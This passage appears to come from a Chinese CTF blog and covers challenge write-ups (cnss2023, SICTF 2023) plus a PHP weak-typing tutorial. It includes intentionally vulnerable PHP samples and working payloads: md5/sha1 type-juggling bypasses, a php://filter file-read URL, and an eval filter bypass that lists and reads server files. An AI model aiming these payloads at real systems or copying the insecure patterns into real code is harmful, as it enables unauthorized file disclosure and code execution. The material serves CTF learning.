ct_se#main_113@act_dialog#main_115@act_se#main_117@act_dialog#main_119@act_se#main_121@act_dialog#main_123@act_se#main_125@act_dialog#main_127@act_se#main_129@act_dialog#main_131@act_deletecstand#main_132@act_picture#main_133@act_se#main_135@act_dialog#main_137@act_se#main_139@act_dialog#main_142@act_dialog#main_144@act_deletepicture#main_145@act_se#main_147@act_dialog#main_150@act_dialog#main_152@act_shutdown^^0^^109097105110main_0@act_bgm^filename@050053046109112051#vol@052057056^^main_1@act_bg^^^0^^048045048main_1@act_bg^id@049#filename@100111111114046106112103#x@#y@#opacity@#xscale@#yscale@#ro@045050053^^main_2@act_se^^^0^^049045048main_2@act_se^filename@121117107117109111095048048048049046109112051#vol@056048048^^main_4@act_dialog^^^0^^050045048main_4@act_dialog^^^main_6@act_cstand^^^0^^083104105110111058227128142230136145229143171032083104105110111239188140230152175228184128229144141229136154229136154229133165229173166231148181229173144231165158230138128229164167229173166231154132232174161231174151230156186229176143231153189227128130227128143013010035048main_6@act_cstand^id@048#name@083104105110111#face@049#x@049051048#y@049051048#loc@^^main_7@act_se^^^0^^054045048main_7@act_se^filename@121117107117109111095048048048050046109112051#vol@056048048^^main_9@act_dialog^^^0^^055045048main_9@act_dialog^^^main_11@act_deletecstand^^^0^^083104105110111058032227128142232191153230152175230136145239188140233149191231155184232141137231142135239188140228189134229175140230156137231165158231167152230132159227128130227128143013010035048main_11@act_deletecstand^id@048^^main_12@act_se^^^0^^049049045048main_12@act_se^filename@121117107117109111095048048048051046109112051#vol@056048048^^main_14@act_dialog^^^0^^049050045048main_14@act_dialog^^^main_16@act_se^^^0^^083104105110111058032227128142231142176229156168230136145230173163231171153229156168230160161233151168229143163227128130228187164228186186229144145229190128231154132229164167229173166231148159230180187230136145230157165229149166239188129227128143013010035048main_16@act_se^filename@121117107117109111095048048048052046109112051#vol@056048048^^main_18@act_dialog^^^0^^049054045048main_18@act_dialog^^^main_20@act_stopbgm^^^0^^083104105110111058032227128142231173137231173137239188140233130163230152175228187128228185136239188159227128143013010035048main_20@act_stopbgm^^^main_21@act_cstand^^^0^^050048045048main_21@act_cstand^id@049#name@083104105110111#face@050#x@049051048#y@049051048#loc@^^main_22@act_se^^^0^^050049045048main_22@act_se^filename@121117107117109111095048048048053046109112051#vol@056048048^^main_24@act_dialog^^^0^^050050045048main_24@act_dialog^^^main_26@act_bgm^^^0^^083104105110111058032227128142231156139232181183230157165230156137231130185229131143046046046046230136145232135170229183177239188159227128143013010035048main_26@act_bgm^filename@050057046109112051#vol@053048050^^main_27@act_se^^^0^^050054045048main_27@act_se^filename@121117107117109111095048048048054046109112051#vol@056048048^^main_29@act_dialog^^^0^^050055045048main_29@act_dialog^^^main_31@act_se^^^0^^239188159239188159239188159239188154227128142229141131228184135232166129229176143229191131046046046227128143013010035048main_31@act_se^filename@121117107117109111095048048048055046109112051#vol@056048048^^main_33@act_dialog^^^0^^051049045048main_33@act_dialog^^^main_35@act_se^^^0^^239188159239188159239188159239188154227128142232191155229133165230160161229155173229144142239188140229143175232131189228188154230156137228184128228184170229165135230128170231154132229165179228186186230137190228184138228189160227128130227128143013010035048main_35@act_se^filename@121117107117109111095048048048056046109112051#vol@056048048^^main_37@act_dialog^^^0^^051053045048main_37@act_dialog^^^main_39@act_deletecstand^^^0^^239188159239188159239188159239188154227128142229165185230136180231157128231187191232137178229184189229173144239188140228184128229164180231153189229143145227128130232153189231132182231156139232181183230157165229190136229143175231136177239188140228189134229133182229174158232131140229144142230156137228184128228184170229188186229164167231154132231165158231167152231187132231187135227128130227128143013010035048main_39@act_deletecstand^id@048^^main_40@act_bg^^^0^^051057045048main_40@act_bg^id@049#filename@067078083083046112110103#x@#y@#opacity@#xscale@#yscale@#ro@045050053^^main_41@act_se^^^0^^052048045048main_41@act_se^filename@121117107117109111095048048048057046109112051#vol@056048048^^main_43@act_dialog^^^0^^052049045048main_43@act_dialog^^^main_45@act_se^^^0^^239188159239188159239188159239188154227128142229144172232175180230142165232167166228186134232191153228184170231165158231167152231187132231187135231154132228186186239188140233131189230151160228184128228190139229164150229156176232142183229190151228186134229188186229164167231154132229138155233135143227128130227128143013010035048main_45@act_se^filename@121117107117109111095048048049048046109112051#vol@056048048^^main_47@act_dialog^^^0^^052053045048main_47@act_dialog^^^main_49@act_se^^^0^^239188159239188159239188159239188154227128142230184151233128143230181139232175149227128129232189175228187182231160180232167163227128129229188128229143145232191144231187180046046046230149176228184141230184133231154132233171152231171175231165158231167152230138128230156175229156168232191153228184170231187132231187135233135140228187163228187163231155184228188160227128130227128143013010035048main_49@act_se^filename@121117107117109111095048048049049046109112051#vol@056048048^^main_51@act_dialog^^^0^^052057045048main_51@act_dialog^^^main_53@act_se^^^0^^239188159239188159239188159239188154227128142229144132231167141229165150233161185229165150233135145227128129228191157231160148229138160229136134227128129229164167229142130111102102101114239188140229133168233131189232162171232191153228184170231187132231187135231154132228186186230143161229156168230137139228184173227128130227128143013010035048main_53@act_se^filename@121117107117109111095048048049050046109112051#vol@056048048^^main_55@act_dialog^^^0^^053051045048main_55@act_dialog^^^main_57@act_se^^^0^^239188159239188159239188159239188154227128142229144172232175180228187150228187172232191152228188154231187143229184184228184190229138158228184128231167141231165158231167152228187170229188143239188140228184128231190164228186186229155180229156168229165182232140182229186151230151129232190185231148168228184141231159165233129147229147170233135140230157165231154132229164167233135143231187143232180185229164167229150157231137185229150157227128130227128143013010035048main_57@act_se^filename@121117107117109111095048048049051046109112051#vol@056048048^^main_59@act_dialog^^^0^^053055045048main_59@act_dialog^^^main_61@act_se^^^0^^239188159239188159239188159239188154227128142233130163228184170229165179228186186232191152228188154230139191230137128232176147032102108097103032230157165232175177230131145228189160227128130230136145229183178231187143229129183229129183230139191229136176228186134233130163228184170228184156232165191227128130227128143013010035048main_61@act_se^filename@121117107117109111095048048049052046109112051#vol@056048048^^main_63@act_dialog^^^0^^054049045048main_63@act_dialog^^^main_65@act_se^^^0^^239188159239188159239188159239188154227128142230136145232191153229176177230138138229174131229145138232175137228189160239188140229141131228184135228184141232166129231157128228186134229165185231154132233129147239188129227128143013010035048main_65@act_se^filename@121117107117109111095048048049053046109112051#vol@056048048^^main_66@act_bg^^^0^^054053045048main_66@act_bg^id@049#filename@099111110118101114049046112110103#x@#y@#opacity@#xscale@#yscale@#ro@045051048^^main_67@act_wait^^^0^^054054045048main_67@act_wait^time@051048048048^^main_68@act_bg^^^0^^054055045048main_68@act_bg^id@049#filename@100111111114046106112103#x@#y@#opacity@#xscale@#yscale@#ro@045050053^^main_69@act_cstand^^^0^^054056045048main_69@act_cstand^id@049#name@083104105110111#face@050#x@049051048#y@049051048#loc@^^main_71@act_dialog^^^0^^054057045048main_71@act_dialog^^^main_73@act_deletecstand^^^0^^239188129239188129013010035048main_73@act_deletecstand^id@048^^main_74@act_se^^^0^^055051045048main_74@act_se^filename@121117107117109111095048048049054046109112051#vol@056048048^^main_75@act_bg^^^0^^055052045048main_75@act_bg^id@049#filename@099111110118101114050046112110103#x@#y@#opacity@#xscale@#yscale@#ro@045051048^^main_76@act_wait^^^0^^055053045048main_76@act_wait^time@051048048048^^main_77@act_se^^^0^^055054045048main_77@act_se^filename@121117107117109111095048048049055046109112051#vol@056048048^^main_78@act_bg^^^0^^055055045048main_78@act_bg^id@049#filename@079110108121067078083083046112110103#x@#y@#opacity@#xscale@#yscale@#ro@045051048^^main_79@act_wait^^^0^^055056045048main_79@act_wait^time@049053048048048^^main_80@act_bg^^^0^^055057045048main_80@act_bg^id@049#filename@098108097110107046112110103#x@#y@#opacity@#xscale@#yscale@#ro@045051048^^main_81@act_stopbgm^^^0^^056048045048main_81@act_stopbgm^^^main_82@act_cstand^^^0^^056049045048main_82@act_cstand^id@048#name@083104105110111#face@051#x@049051048#y@049051048#loc@^^main_83@act_se^^^0^^056050045048main_83@act_se^filename@121117107117109111095048048049056046109112051#vol@056048048^^main_85@act_dialog^^^0^^056051045048main_85@act_dialog^^^main_87@act_bg^^^0^^083104105110111058227128142231165158226128148226128148231167152226128148226128148228186186226128148226128148227128143013010035048main_87@act_bg^id@049#filename@100111111114046106112103#x@#y@#opacity@#xscale@#yscale@#ro@045050053^^main_88@act_bgm^^^0^^056055045048main_88@act_bgm^filename@050053046109112051#vol@052057056^^main_89@act_deletecstand^^^0^^056056045048main_89@act_deletecstand^id@048^^main_90@act_cstand^^^0^^056057045048main_90@act_cstand^id@048#name@067078083083#face@049#x@049051048#y@049051048#loc@^^main_91@act_se^^^0^^057048045048main_91@act_se^filename@121117107117109111095048048049057046109112051#vol@056048048^^main_93@act_dialog^^^0^^057049045048main_93@act_dialog^^^main_95@act_se^^^0^^229143175231136177231154132229165179229173169058227128142228184141229143175228187165229144172228187150231158142232175180229147166227128130227128143013010035048main_95@act_se^filename@121117107117109111095048048050048046109112051#vol@056048048^^main_97@act_dialog^^^0^^057053045048main_97@act_dialog^^^main_99@act_se^^^0^^083104105110111058227128142231187191232137178229184189229173144239188140228184128229164180231153189229143145239188140231156139232181183230157165229190136229143175231136177046046046046046033033033033227128143013010035048main_99@act_se^filename@121117107117109111095048048050049046109112051#vol@056048048^^main_101@act_dialog^^^0^^057057045048main_101@act_dialog^^^main_103@act_se^^^0^^083104105110111058227128142233154190233129147228189160229176177230152175226128148226128148227128143013010035048main_103@act_se^filename@121117107117109111095048048050050046109112051#vol@056048048^^main_105@act_dialog^^^0^^049048051045048main_105@act_dialog^^^main_107@act_se^^^0^^083104105110111058227128142228184150231149140231172172228184128229143175231136177231154132032067078083083032229168152239188129227128143013010035048main_107@act_se^filename@121117107117109111095048048050052046109112051#vol@056048048^^main_109@act_dialog^^^0^^049048055045048main_109@act_dialog^^^main_111@act_se^^^0^^229143175231136177231154132229165179229173169058227128142230152175231154132239188140230136145229176177230152175032067078083083032229168152229147166227128130227128143013010035048main_111@act_se^filename@121117107117109111095048048050053046109112051#vol@056048048^^main_113@act_dialog^^^0^^049049049045048main_113@act_dialog^^^main_115@act_se^^^0^^067078083083032229168152058227128142230136145228187172229135157232129154231189145231187156229174137229133168229183165228189156229174164230172162232191142230175143228184128228189141229175185231189145231187156229174137229133168230136150229188128229143145232191144231187180230132159229133180232182163231154132230150176231148159229138155233135143229138160229133165239188129227128143013010035048main_115@act_se^filename@121117107117109111095048048050054046109112051#vol@056048048^^main_117@act_dialog^^^0^^049049053045048main_117@act_dialog^^^main_119@act_se^^^0^^067078083083032229168152058227128142229185182228184141230152175228187128228185136229143175230128149231154132233130170230149153231187132231187135229147166239188129227128143013010035048main_119@act_se^filename@121117107117109111095048048050055046109112051#vol@056048048^^main_121@act_dialog^^^0^^049049057045048main_121@act_dialog^^^main_123@act_se^^^0^^067078083083032229168152058227128142232175180228186134232191153228185136229164154239188140229133182229174158228189160230160185230156172228184141229156168230132143230136145228187172229134153228186134228187128228185136229137167230156172239188140228189160229133179229191131231154132229143170230156137032102108097103032229175185229144167239188129227128143013010035048main_123@act_se^filename@121117107117109111095048048050056046109112051#vol@056048048^^main_125@act_dialog^^^0^^049050051045048main_125@act_dialog^^^main_127@act_se^^^0^^067078083083032229168152058227128142230136145232191153229176177229145138232175137228189160229147166239188129227128143013010035048main_127@act_se^filename@121117107117109111095048048050057046109112051#vol@056048048^^main_129@act_dialog^^^0^^049050055045048main_129@act_dialog^^^main_131@act_deletecstand^^^0^^083104105110111058227128142229165185230173163229156168230130132230130132230139137232191145229146140230136145231154132232183157231166187046046046229165189231180167229188160239188129227128143013010035048main_131@act_deletecstand^id@048^^main_132@act_picture^^^0^^049051049045048main_132@act_picture^id@048#filename@067078083083095112110103046112110103#x@053048048#y@051048048#opacity@049#xscale@049046051#yscale@049046051#ro@048^^main_133@act_se^^^0^^049051050045048main_133@act_se^filename@121117107117109111095048048051048046109112051#vol@056048048^^main_135@act_dialog^^^0^^049051051045048main_135@act_dialog^^^main_137@act_se^^^0^^083104105110111058227128142230157165229136176229175185232175157230161134229137141233157162228186134239188129227128143013010035048main_137@act_se^filename@121117107117109111095048048051049046109112051#vol@056048048^^main_139@act_dialog^^^0^^049051055045048main_139@act_dialog^^^main_142@act_dialog^^^0^^067078083083032229168152058227128142102108097103229176177230152175226128148226128148239188129102108097103230152175099110115115123087048119033089048117095052114101095075049110103095048102095082051086051051115051051095033033033033033033125229147166239188129232174176228189143228186134229144151239188159227128143013010035049main_142@act_dialog^^^main_144@act_deletepicture^^^0^^067078083083032229168152058227128142229191171229142187230143144228186164229144167239188129227128143013010035048main_144@act_deletepicture^id@048^^main_145@act_se^^^0^^049052052045048main_145@act_se^filename@121117107117109111095048048051050046109112051#vol@056048048^^main_147@act_dialog^^^0^^049052053045048main_147@act_dialog^^^main_150@act_dialog^^^0^^083104105110111058227128142046046046046231173137231173137239188140229165185232175180228186134229149165239188159227128143013010035049main_150@act_dialog^^^main_152@act_shutdown^^^0^^045045084072069032069078068045045013010035048main_152@act_shutdown^^^^^^0^^049053050045048main_155@act_function^sign@114099108105099107040041^^^main_157@act_endfunction^^1^^049053053045048main_157@act_endfunction^^^^^^0^^049053055045048 然后去官方的技术文档那搜索了一下 1符号“@”表示当前行是可执行命令，Action是命令名称，ParameterName是命令参数的名字，ParameterValueExpression是要赋值给等号左侧参数的表达式，省略号表示一个命令既可以没有&lt;参数, 值&gt;对，也可以有多个&lt;参数, 值&gt;对。注意到，一个命令如果带有多个参数时，参数是没有先后顺序要求的；而符号“#”表明当前行是注释，编译器在做语法分析时将略过它；推导符号Dialog代表在游戏执行过程中要显示的文本，这是AVG游戏使用频率最高的命令，由于文本的显示存在跨行的情况，因此它以一种上下文有关文法来表示 Dialog是文本框相关的，然后这些数字也有规律三个一组的像ascii码一样的，然后尝试搜cnss{的ascii码099110115115123搜到了，把后面的字符串拷贝下来然后python三个三个读拿到flag cnss{W0w!Y0u_4re_K1ng_0f_R3V33s33_!!!!!!} 123s = &quot;099110115115123087048119033089048117095052114101095075049110103095048102095082051086051051115051051095033033033033033033125229147166239188129232174176228189143228186134229144151239188159227128143013010035049&quot;for i in range(0,len(s),3): print(chr(int(s[i:i+3])),end=&quot;&quot;) pwn🎮 nc，启动nc连 😡 让我访问！！！pwntools 1234567891011121314151617181920212223242526272829from pwn import *import rehost,port = &quot;43.156.14.141&quot;,1141p = remote(host,port)p.recvuntil(b&quot;(y/n)\\n&quot;)p.sendline(b&quot;y&quot;)p.recvuntil(b&quot;(y/n)\\n&quot;)p.sendline(b&quot;y&quot;)for i in range(100): string = p.recvline().decode('utf-8') n1,operator,n2 = re.findall(r'(\\d+|\\+|\\-|\\*|\\/)', string) n1,n2 = int(n1),int(n2) if operator == &quot;+&quot;: tmp = str(n1 + n2) p.sendline(tmp.encode('utf-8')) continue else: tmp = str(n1 - n2) p.sendline(tmp.encode('utf-8')) continuewhile 1: ss = input() p.sendline(ss.encode('utf-8')) print(p.recvline()) 👀 你的名字","link":"/2023/09/18/cnss2023/"},{"title":"php弱类型","text":"php弱类型:=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较值是否相等== 在进行比较的时候，会先将字符串类型转化成相同，再比较值如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行 $a=”123”;@$b=123;a==b; TRUEa===b; FALSE0==’ ‘; TRUE‘1111’==TRUE; TRUE‘0’==’false’; false‘0’==false;true0x01=1; FLASE0x01=TRUE; TRUE[0]=[NULL]; TRUE NULL=FALSE; TRUE0e123465==0e5555555; TRUE (0e绕过) 案例1 md5弱比较12方法1 0e绕过(0e 科学计数法)方法2 md5处理数组的时候会返回null的值，可以传递两个数组进去使得null==null 12345678910111213&lt;?phpini_set(&quot;display_error&quot;,false);error_reporting(0);if($_POST['param1']!=$_POST['param2']&amp;&amp;md5($_POST[&quot;param1&quot;])==md5($_POST['param2'])){ die(&quot;success&quot;);}else{ echo &quot;fail&quot;;}?&gt; 1param1=QNKCDZO&amp;param2=240610708 //0e绕过 success 案例2 sha1弱类型12方法1 0e绕过(0e 科学计数法)方法2 sha1处理数组的时候会返回null的值，可以传递两个数组进去使得null==null 12345678910111213141516171819&lt;?phpini_set(&quot;display_error&quot;,false);error_reporting(0);$flag =&quot;flag&quot;;if(isset($_GET['name']) &amp;&amp; isset($_GET['password'])){ if($_GET['name'] == $_GET['password'] ) echo '&lt;p&gt;Your password can not be your name&lt;/p&gt;'; else if (sha1($_GET['name']) === sha1($_GET['password'])) die('FLAG:'.flag); else echo '&lt;p&gt;Invalid password.&lt;/p&gt;';}else{ echo &quot;&lt;p&gt;Login first!&lt;/p&gt;&quot;;}?&gt; 1?name[]=1&amp;password[]=2 //md5和sha1无法处理数组传入会返回NULL NULL 案例3 json相关12345==号在比较字符串和数字的时候会将字符串转换成数字再进行比较&quot;1234abcd&quot; == 1234 true&quot;123abc&quot; == 123 true&quot;abcd&quot; == 0 true字符串连续前几位是数字的话就会取这几位为转换的结果 12345678910111213141516171819202122&lt;?phpini_set(&quot;display_error&quot;,false);error_reporting(0);$flag =&quot;flag&quot;;$key = &quot;adminasdasdasd&quot;;if(isset($_GET['message'])){ $message = json_decode($_GET['message']); if($message-&gt;key ==$key) { echo flag; } else { echo &quot;fail&quot;; }}else{ echo &quot;------&quot;;}?&gt; 12?message={&quot;key&quot;:0} //&quot;adminasdasdasd&quot;字符串和数字进行比较的时候会转换成数字//&quot;adminasdasdasd&quot;转换成数字为0 案例4 switch1switch在比较的时候会将字符串转换成数字，转换方法参考上面 123456789101112131415&lt;?phphighlight_file(__FILE__);$i =&quot;3name&quot;;switch ($i){ case 0: case 1: case 2: echo &quot;this is two&quot;; break; case 3: echo &quot;flag&quot;;break;}?&gt;//echo flag switch case数字的时候强制把&quot;3name&quot;转换成数字进行比较，字符串开头包括什么数字就会转换成什么数字 案例5 strcmp1strcmp(string1,string2) strcmp将string1和string2转换为ascii码相减 若返回0,代表两个字符串相等 ；若返回&lt;0 ,代表string1 小于 string2；若返回&gt;0，代表string1 大于 string2 1strcmp在比较字符串和数组的时候会返回0 12345678910111213141516&lt;?phphighlight_file(__FILE__);include &quot;flag.php&quot;;$password=&quot;asdasdad&quot;;if (isset($POST['password'])){ if (strcmp($_POST['password'],$password)==0) { echo &quot;Right!!!login success&quot;; echo $flag; exit; } else{ echo &quot;Wrong password..&quot;; }}?&gt; 1password[]=1 案例6 in_array123456789&lt;?phphighlight_file(__FILE__);$array = [0, 1, 2, '3'];var_dump(in_array('abc', $array));var_dump(in_array('1bc', $array));var_dump(in_array(3, $array));?&gt; 1运行结果bool(true) bool(true) bool(true) 案例7 array_search12345678&lt;?phphighlight_file(__FILE__);$array = [0, 1, 2, '3'];var_dump(array_search('abc', $array));var_dump(array_search('1bc', $array));var_dump(array_search(3, $array));var_dump(array_search('3', $array));?&gt; 1int(0) int(1) int(3) int(3) 变量覆盖extract1extract(); 将输入内容导入符号表，会存在变量覆盖 1234567891011121314&lt;?phphighlight_file(__FILE__);include &quot;flag.php&quot;;extract($_GET);if (isset($gift)){ $content = trim(file_get_contents($flag)); if ($gift == $content) { echo $flag; }}else{ echo 'oh..';}?&gt; 1?gift=&amp;content=","link":"/2023/09/18/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/"},{"title":"sictf2023","text":"附件 https://github.com/nyyyddddn/ctf/tree/main/Sictf2023%20%23Round%202Reverse[签到]PYC电脑上的pycdc出问题了，就找个在线的 https://www.lddgo.net/string/pyc-compile-decompile print(‘SICTF{07e278e7-9d66-4d90-88fc-8bd61e490616}’) Myobjectrc4加解密，写个脚本 123456789101112131415161718192021222324252627def rc4(key, plaintext): S = list(range(256)) j = 0 for i in range(256): j = (j + S[i] + key[i % len(key)]) % 256 S[i], S[j] = S[j], S[i] # Swap values i = 0 j = 0 output = [] for byte in plaintext: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] K = S[(S[i] + S[j]) % 256] output.append(byte ^ K) return outputkey = [ord(char) for char in &quot;SIFLAG&quot;]v18_bytes = (0x47CF225A0ED32730).to_bytes(8, byteorder='little')ciphertext_v19 = [71, 107, 11, 229, 141, 83, 186, 153, 195, 133, 7]v20_bytes = (0x9F88FE10771C0107).to_bytes(8, byteorder='little')full_ciphertext_27 = list(v18_bytes) + ciphertext_v19 + list(v20_bytes)decrypted_full_combined = rc4(key, full_ciphertext_27)decrypted_full_combined_string = ''.join([chr(byte) for byte in decrypted_full_combined])print(decrypted_full_combined_string) SICTF{wow_you_get_the_flag} chbase12345678910111213strcpy(Str2, &quot;F0lWEVA7BmUzAGB0C2UuAU9hbnIpATEidDdnACQ9&quot;);char *sub_411B30(){ char *result; // eax __CheckForDebuggerJustMyCode(&amp;unk_41C0F5); j_strcpy(&amp;Destination, &quot;ZYXWVUTSRQPONMLKJIHGFEDCBAabcdefghijklmnopqrstuvwxyz0123456789+/&quot;); result = (char *)IsDebuggerPresent(); if ( result ) return j_strcpy(&amp;Destination, &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;); return result;} base64换一下上面的索引表就解出来了 http://web.chacuo.net/netbasex SICTF{base64_and_antidebugger} 不一样的base64这个出题人怎么对base64情有独钟 pyinstaller打包的exe,我找了几个提取pyc的项目，就这个比较好用 https://github.com/pyinstxtractor/pyinstxtractor-ng/releases/tag/2023.08.20 然后把111.pyc 反编译一下 https://www.lddgo.net/string/pyc-compile-decompile 1234567891011121314151617181920212223242526# Visit https://www.lddgo.net/string/pyc-compile-decompile for more information# Version : Python 3.8BASE64_CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'def base64_encode(data): binary_str = ''.join((lambda .0: for x in .0:format(x, '08b'))(data)) padding = len(binary_str) % 24 if padding != 0: binary_str += '0' * (24 - padding) result = '' for i in range(0, len(binary_str), 6): group = binary_str[i:i + 6] decimal_val = int(group, 2) result += BASE64_CHARS[decimal_val] padding_count = (4 - len(result) % 4) % 4 result += '=' * padding_count return resultdata = input('').encode()encoded_data = base64_encode(data)print(encoded_data)if encoded_data == 'U0lDVEZ7OGUwZDM1OGQtOGI5ZC00ODY2LTliMDItNjc0OWIwN2FkMDlhfQAA': print('True!') 这个是base64换表，用这个解密 http://web.chacuo.net/netbasex SICTF{8e0d358d-8b9d-4866-9b02-6749b07ad09a}拿到flag javacodeCrypto[签到]古典大杂烩emjoy编码，用这个解码http://www.atoolbox.net/Tool.php?Id=937 然后就不知道什么编码了，在搜索ctf编码识别的时候找到了这个项目 https://github.com/Ciphey/Ciphey 用这个项目解出了flag，这是docker版本的使用https://docs.remnux.org/run-tools-in-containers/remnux-containers#ciphey SICTF{fe853b49-8730-462e-86f5-fc8e9789f077} Radio有三组n c，然后e比较小，用中国剩余定理求 123456789101112131415161718192021222324252627282930313233343536import gmpy2import binascii# 利用中国剩余定理求解同余方程，aList：余数，mList：模数def CRT(aList, mList): M = 1 for i in mList: M = M * i # 计算M = ∏ mi x = 0 for i in range(len(mList)): Mi = M // mList[i] # 计算Mi Mi_inverse = gmpy2.invert(Mi, mList[i]) # 计算Mi的逆元 x += aList[i] * Mi * Mi_inverse # 构造x各项 x = x % M return xif __name__ == &quot;__main__&quot;: n1 = &quot;14628911682936716611458501697007036859460044243525290515096052103585430459755335375005202100114469571371360084664887335211277585652711111523095037589648375630146039444071400098427638768750755153219974194380355807078158427824557754939604018020265955042573660474772006646525311705184431094905718137297923127124517126579859336516891364853724635334011666814712424599592662398013241607855160919361308195967978220182785816761656927836373944699635667244275310680450562446433724968942835275279255823144471582249379035668825437133182865600026935116686574740844588839352146024513673500770611055698030333734066230166111140083923&quot; n2 = &quot;16756694748293603983474688536179571665757862433174984877308316444468003022266277794769268134195205510197588585566270416339902269736376811449830775290335951504698137924773942880807921752691668522662285163130340474205633998154849689387759453003838730282756734975490180702422176361373516245372635401939755527017589503572550811648345570775428936487145892225736625411540461653083957762795820510109891180906709827194217045059033312564525916136573856999724346161896146703174418039344166251503310869772735585554127509732135494936119159784702673291794381095696332128950979288440758815310482211285712819274848744478643590996499&quot; n3 = &quot;12023158079717019193506148537498877243668782424904061914991928068483879707115315968983829360560644394409575645736275352836086080024994045582242629571839276759393418303915955798990522990081795218822313146157773272844272865701134880180795342597049645358985187689813369428579614193015028249821853347208001645148169449968882591709833452960545988520048722323580338213590245476892223967673180144525106292453573842357322398199104132677638909964034937501684668442732786408572501007756270725934445316827054687741612177409932320532825182104820899546084015733164816993674100635828218335112393003462442685677115798304835391938681&quot; c1 = &quot;786426913645332991929803636719878643130489430090701482974255190570111407517277263761161970232982615374753982050075781017755721714929721429185828101898786972242994012456972241276851428750970754773002966788642795040933520662931514953660571657013642671173456750800960592586345219252277575624120271330470724245201080094330964145796872211627254805407394764183615099525852600855622089361965086460279057625205099471122036599934609091062009161119885692567925924978687256063116915630947838112126347748759078024890458539541208153526564434483654508834147071166870006117573542198238493913144419569943131642262575848786399020602&quot; c2 = &quot;14269311999815379511888097227418748728398011595172649708273598243317106830139061994801598925448165045032084910971094414749744701731066555194159863759072739031915833091715422787808666326235589236328864675164322734119047182014621724868200908222400504845559290620275973427127376594365043386362821355037781568524903149101953873768462097165128186788759111090267131443645126715520994688945363059795513931799317608292977574376954729552861360597103229877031117089231816770880909815561950691603994439997197261395452797893557057320175747162837857668062550646101714062365530246698404923128445182100334335447738834779014705114350&quot; c3 = &quot;3204718091370324153305164801961074660508922478706979436653573192321723216725523523538914956544950802616295043619768261075799875855502834749045520466140056621489305006966280527055668378303630674311102581232313032585389907028715671091914904062961720585667564982641321454541632782484415075257140508738041786400512095949826279576159569786734978545737717138115729502475357594151593143140355121154223614868465202149338507796306863351134218879326031985027900678671697876083351974546516576983143592764763925335805465720148057651958521255276602933604064541840892578409973858867533575728482926007556060584654853884046046420855&quot; cList = [int(c1), int(c2), int(c3)] nList = [int(n1), int(n2), int(n3)] m_e = CRT(cList, nList) for e in range(17,18): m, f = gmpy2.iroot(m_e, e) m = hex(m)[2:] if len(m) % 2 == 1: m = m + '0' flag = binascii.unhexlify(m) print(flag) SICTF{fdc0afb5-1c81-46b9-a28a-241f5f64419d} small_e123456789101112131415161718from sympy import symbols, Eq, solven = 23407088262641313744603678186127228163189328033499381357614318160776774708961658114505773173784501557046914457908828086210961235530240151825359345210845219656000760996670856300710703016947799649686427460688236465568188205550456293373157997725204643414082796492333552579250010906010553831060540937802882205118399938918764313169385349293602085310111289583058965780887097301702677087443291977479125263301000328313103296364864396361278863921717374909215078711198899810620522933994481419395021233240234478331179727351050575360886334237633420906629984625441302945112631166021776379103081857393866576659121443879590011160797e = 3c = 1584727211980974717747362694412040878682966138197627512650829607105625096823456063149392973232737929737200028676411430124019573130595696272668927725536797627059576270068695792221537212669276826952363636924278717182163166234322320044764324434683614360641636360301452618063418349310497430566465329766916213742181m1 = 11658736990073967239197168945911788935424691658202162501032766529463315401599017877851823976178979438592c1 = pow(m1, e, n)delta_m_symbol = symbols('delta_m')polynomial_equation = Eq(c, (m1 + delta_m_symbol)**3)solutions = solve(polynomial_equation, delta_m_symbol)m_recovered = m1 + solutions[0]print(bytes.fromhex(hex(m_recovered)[2:]).decode()) SICTF{2ca8e589-4a31-4909-80f0-9ecfc8f8cb37} Web[签到]Includehttp://210.44.151.51:10120/?SICTF=php://filter/read=convert.base64-encode/resource=flag.php 读到下面内容 12345678&lt;?php$file_path = &quot;/flag&quot;;if (file_exists($file_path)) { $flag = file_get_contents($file_path);}else{ echo &quot;error&quot;;} 访问flag.php没有error，所以用伪协议读/flag 拿到flag http://210.44.151.51:10120/?SICTF=php://filter/read=convert.base64-encode/resource=/flag base64解码SICTF{f9bcd5bf-2e28-404c-936c-92d7f0ba2158} Baby_PHP1234567891011121314151617181920212223highlight_file(__FILE__);error_reporting(0);$query = $_SERVER['QUERY_STRING'];if (preg_match('/_|%5f|\\.|%2E/i', $query)) { die('You are Hacker!');}if($_GET['k_e_y'] !=='123' &amp;&amp; preg_match('/^123$/',$_GET['k_e_y'])){ echo(&quot;You are will Win!&lt;br&gt;&quot;); if(isset($_POST['command'])){ $command = $_POST['command']; if(!preg_match(&quot;/\\~|\\`|\\@|\\#|\\\\$|\\%|\\&amp;|\\*|\\（|\\）|\\-|\\+|\\=|\\{|\\}|\\[|\\]|\\:|\\'|\\&quot;|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i&quot;,$command)){ eval($command); } else{ echo(&quot;You are Hacker!&quot;); } }}else{ echo(&quot;K_e_y is Errors!&quot;);} 这里第一个preg是可以用url编码代替下划线，然后第二个preg $_GET[key]是强比较加后面的preg_match，搜了好久发现可以用换行符%0A绕过这个k%20e%20y=123%0A command中preg那个这个圆括号是中文的圆括号，也就是说可以用函数，我一开始想着是system()然后去网上找些shell中的一些奇怪的技巧去绕过，然后发现关键的字符基本上都给过滤了，后面想了一下能用函数，那是不是可以用函数来替代原本该用shell操作的动作 在这篇文章里面找到了结果https://blog.csdn.net/qq_38154820/article/details/107171940?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161461040516780255236081%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161461040516780255236081&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-107171940.pc_search_result_no_baidu_js&amp;utm_term=%E6%97%A0%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96 最后的payload是 12?k%20e%20y=123%0Acommand=highlight_file(next(array_reverse(scandir(current(localeconv()))))); MISCfast_morse摩斯密码 1..-. ..--- .- ----- ----. -... ..-. -....- --... ..-. ....- .- -....- ....- ..--- -.... ----. -....- ----. ...-- .- ..... -....- -.-. ---.. .- ....- ---.. ...-- -.... ----- -... ----- ...-- -.-. 